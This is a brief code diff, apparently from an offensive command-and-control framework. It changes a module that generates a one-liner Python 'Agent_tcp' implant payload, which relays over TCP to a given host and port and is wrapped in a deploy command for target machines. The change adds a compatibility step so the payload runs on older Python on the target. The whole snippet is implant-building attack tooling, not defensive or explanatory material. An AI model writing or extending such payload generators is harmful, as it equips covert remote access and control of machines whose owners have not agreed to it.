@@ -11,6 +11,7 @@ import secrets
 
 from server.core.bootstrap import deploy_command
 from server.transports.agent_base import relay_code
+from server.core.pycompat import downgrade_py35
 
 MODULE = {
     "desc": "生成 Agent_tcp 一句话 python 载荷(TCP 直连中继, 端口转发语义)",
@@ -93,6 +94,7 @@ def run(host, port, server_key_hex=None, out_dir=None, agent_id=None):
                       str(list(agent_key)).replace(" ", ""),
                       host, port, via, long_lived=True)
     code += _LISTEN_CODE.replace("_LP", str(listen_port))
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<agent_tcp>", "exec")  # 生成即校验
 
     command = deploy_command(code)
